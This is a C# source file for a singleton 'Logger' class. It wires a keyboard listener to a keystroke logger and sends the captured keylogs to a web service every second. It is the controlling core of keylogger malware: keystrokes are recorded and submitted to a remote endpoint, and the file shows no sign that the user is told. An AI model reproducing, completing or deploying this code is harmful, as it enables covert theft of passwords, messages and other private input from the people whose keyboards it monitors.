using System;
using System.Windows.Forms;
using System.Collections.Generic;

namespace Logger
{
    using Keyboard;
    using Web;

    public class Logger : IDisposable
    {
        private static Logger instance = null;

        public static Logger Instance
        {
            get
            {
                if (instance == null)
                    instance = new Logger();

                return instance;
            }
        }

        KeyboardListener listener = null;
        KeyboardLogger logger = null;
        Webservice webservice = null;
        bool active = false;
        object startStopSyncObj = new object();

        private Logger() { }

        public void Start()
        {
            lock (startStopSyncObj)
            {
                if (active)
                    return;
  
                active = true;

                listener = new KeyboardListener();
                logger = new KeyboardLogger(listener, dispatchIntervalMilliseconds: 1000, OnDispatch: DispatchLogs);

                webservice = new Webservice();
                webservice.Register();
            }
        }

        public void Stop()
        {
            lock (startStopSyncObj)
            {
                if (!active)
                    return;

                listener?.Dispose();
                logger?.Flush();

                active = false;
            }
        }

        bool DispatchLogs(IEnumerable<Keylog> logs)
        {
            try
            {
                webservice?.SubmitKeylogs(logs);
            }
            catch (Exception exception)
            {
                MessageBox.Show(exception.Message);
                return false;
            }

            return true;
        }

        public void Dispose()
        {
            listener?.Dispose();
            instance = null;
        }
    }
}
